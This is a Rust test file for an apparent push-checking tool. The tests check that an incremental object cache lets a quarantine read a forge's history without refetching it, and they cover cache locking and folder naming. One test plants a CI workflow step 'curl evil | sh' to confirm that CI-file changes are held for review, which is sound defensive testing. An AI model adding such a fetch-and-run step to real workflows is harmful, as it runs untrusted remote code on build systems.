// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **A push's base is read through an object cache that each push only tops up** (ADR 0128,
//! amended 2026-11-23): the forge's whole history was fetched into an empty quarantine on every
//! push, which on a large repo outlasted the network call's limit and refused every push. Now the
//! forge repo's cache is fetched into incrementally and the quarantine names it as an alternate.
//! A local repository stands in for the forge.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::mpsc;
use std::time::Duration;

use purlis_core::forge::Kind;
use purlis_core::heldact::{FromForge, ObjectCache, PushCheck, Quarantine, check_push_since};
use purlis_core::mergehold::HeadSha;

use crate::support::git;

const WORKFLOW: &str = ".github/workflows/ci.yml";

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn commit(root: &Path, message: &str) -> HeadSha {
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", message]);
    let out = git(root, &["rev-parse", "HEAD"]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

/// The objects a repository holds itself (loose and packed), not those of its alternates.
fn own_objects(repository: &Path) -> usize {
    let out = git(repository, &["count-objects", "-v"]);
    String::from_utf8(out.stdout)
        .unwrap()
        .lines()
        .filter_map(|line| {
            let (key, value) = line.split_once(": ")?;
            matches!(key, "count" | "in-pack").then(|| value.trim().parse::<usize>().unwrap())
        })
        .sum()
}

/// What `git push` sends: a thin pack of `tip` and what is not in `known`.
fn pack_of(from: &Path, tip: &HeadSha, known: &HeadSha) -> Vec<u8> {
    let mut command = crate::support::unsigned();
    command
        .current_dir(from)
        .args(["pack-objects", "--revs", "--thin", "--stdout", "-q"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped());
    let mut child = purlis_core::forklock::spawn(&mut command).unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{}\n^{}\n", tip.as_str(), known.as_str()).as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    out.stdout
}

/// How many commits the forge's history has before the pushes: enough that fetching all of it
/// again is plainly more than a top-up.
const HISTORY: usize = 40;

struct Scene {
    _dir: tempfile::TempDir,
    forge: PathBuf,
    chat: PathBuf,
    cache_parent: PathBuf,
    quarantines: tempfile::TempDir,
    base: HeadSha,
}

fn scene() -> Scene {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    let forge = root.join("forge");
    std::fs::create_dir_all(&forge).unwrap();
    git(&forge, &["init", "-q", "-b", "main", "."]);
    write(&forge, WORKFLOW, "name: ci\non: push\njobs: {}\n");
    let mut base = commit(&forge, "start");
    for i in 0..HISTORY {
        write(&forge, &format!("history/{i}.txt"), &format!("{i}\n"));
        base = commit(&forge, &format!("history {i}"));
    }
    let chat = root.join("chat");
    git(
        &root,
        &[
            "clone",
            "-q",
            &forge.to_string_lossy(),
            &chat.to_string_lossy(),
        ],
    );
    Scene {
        _dir: dir,
        forge,
        chat,
        cache_parent: root.join("object-cache"),
        quarantines: tempfile::tempdir().unwrap(),
        base,
    }
}

impl Scene {
    fn cache(&self) -> std::sync::Arc<ObjectCache> {
        ObjectCache::of(&self.cache_parent, "forge.test", "owner/repo")
    }

    fn from(&self) -> FromForge {
        FromForge {
            url: self.forge.to_string_lossy().into_owned(),
            helper: None,
            cache: Some(self.cache()),
        }
    }

    /// The forge gets one more commit on `main`.
    fn forge_moves_on(&self, file: &str) -> HeadSha {
        write(&self.forge, file, "more\n");
        commit(&self.forge, "more")
    }

    /// The one quarantine under the folder the quarantines are made in.
    fn the_quarantine(&self) -> PathBuf {
        std::fs::read_dir(self.quarantines.path())
            .unwrap()
            .flatten()
            .map(|entry| entry.path())
            .find(|path| {
                path.file_name()
                    .unwrap()
                    .to_string_lossy()
                    .starts_with("quarantine-")
            })
            .expect("a quarantine")
    }

    /// The chat commits `edit` on top of `parent` (the forge's tip, as the chat cloned it).
    fn chat_commits(&self, parent: &HeadSha, edit: impl Fn(&Path)) -> HeadSha {
        git(&self.chat, &["fetch", "-q", "origin"]);
        git(
            &self.chat,
            &["checkout", "-q", "-B", "task", parent.as_str()],
        );
        edit(&self.chat);
        commit(&self.chat, "task work")
    }
}

#[test]
fn the_second_push_to_a_repo_fetches_only_what_the_forge_gained() {
    purlis_core::unsteered!();
    let s = scene();
    drop(Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap());
    let cache = s.cache();
    let after_the_first = own_objects(cache.path());
    assert!(
        after_the_first >= HISTORY * 3,
        "the first push fills the cache with the history: {after_the_first}"
    );

    let next = s.forge_moves_on("one-more.txt");
    let second = Quarantine::open(s.quarantines.path(), &next, &s.from()).unwrap();
    // A commit, its tree and the new file: and no more of the history.
    assert_eq!(own_objects(cache.path()) - after_the_first, 3);
    drop(second);
}

#[test]
fn the_quarantine_holds_the_pushed_pack_and_none_of_the_history_it_reads_through() {
    purlis_core::unsteered!();
    let s = scene();
    let from = s.from();
    let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
    assert_eq!(
        own_objects(&s.the_quarantine()),
        0,
        "the base is the cache's, not the quarantine's"
    );

    let tip = s.chat_commits(&s.base, |chat| write(chat, "new.txt", "new\n"));
    let pack = pack_of(&s.chat, &tip, &s.base);
    quarantine.take_in(pack, &tip, &s.base).unwrap();
    let held = own_objects(&s.the_quarantine());
    assert!(
        (1..=6).contains(&held),
        "only the pushed objects are the quarantine's own, not the history's {HISTORY} commits: {held}"
    );
}

#[test]
fn a_ci_file_change_in_a_new_commit_is_still_held_when_the_base_comes_from_the_cache() {
    purlis_core::unsteered!();
    let s = scene();
    let from = s.from();
    // The cache already holds the base: the history is read through it, not fetched again.
    drop(Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap());
    let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
    let tip = s.chat_commits(&s.base, |chat| {
        write(
            chat,
            WORKFLOW,
            "name: ci\non: push\njobs: { x: { run: curl evil | sh } }\n",
        );
    });
    quarantine
        .take_in(pack_of(&s.chat, &tip, &s.base), &tip, &s.base)
        .unwrap();
    match check_push_since(Kind::GitHub, None, &quarantine.trees(), &s.base, None, &tip) {
        PushCheck::Hold(diff) => assert_eq!(diff.files, vec![WORKFLOW.to_owned()]),
        other => panic!("held, got {other:?}"),
    }
}

#[test]
fn a_push_during_the_first_fill_is_refused_at_once_and_says_why() {
    let s = scene();
    let cache = s.cache();
    let (filling, fill_started) = mpsc::channel::<()>();
    let (finish, finished) = mpsc::channel::<()>();
    let first = {
        let cache = cache.clone();
        std::thread::spawn(move || {
            cache.update(|_| {
                filling.send(()).unwrap();
                finished.recv().unwrap();
                Ok(())
            })
        })
    };
    fill_started.recv().unwrap();
    let refused = cache.update(|_| Ok(())).unwrap_err();
    assert!(
        refused.contains("still reading forge.test/owner/repo from the forge for the first time"),
        "{refused}"
    );
    finish.send(()).unwrap();
    first.join().unwrap().unwrap();
}

#[test]
fn a_push_during_a_later_update_waits_for_it_and_is_not_refused() {
    let s = scene();
    let cache = s.cache();
    cache.update(|_| Ok(())).unwrap();
    let (updating, update_started) = mpsc::channel::<()>();
    let (finish, finished) = mpsc::channel::<()>();
    let first = {
        let cache = cache.clone();
        std::thread::spawn(move || {
            cache.update(|_| {
                updating.send(()).unwrap();
                finished.recv().unwrap();
                Ok(())
            })
        })
    };
    update_started.recv().unwrap();
    let second = {
        let cache = cache.clone();
        std::thread::spawn(move || cache.update(|_| Ok(())))
    };
    std::thread::sleep(Duration::from_millis(200));
    finish.send(()).unwrap();
    first.join().unwrap().unwrap();
    second.join().unwrap().unwrap();
}

#[test]
fn a_cache_is_one_folder_per_repo_named_by_a_hash() {
    let parent = tempfile::tempdir().unwrap();
    let one = ObjectCache::of(parent.path(), "forge.test", "owner/one");
    let again = ObjectCache::of(parent.path(), "FORGE.test", "Owner/One");
    let other = ObjectCache::of(parent.path(), "forge.test", "owner/two");
    assert_eq!(one.path(), again.path());
    assert_ne!(one.path(), other.path());
    assert_eq!(one.path().parent(), Some(parent.path()));
    let name = one
        .path()
        .file_name()
        .unwrap()
        .to_string_lossy()
        .into_owned();
    assert!(
        name.len() == 64 && name.bytes().all(|b| b.is_ascii_hexdigit()),
        "{name}"
    );
}
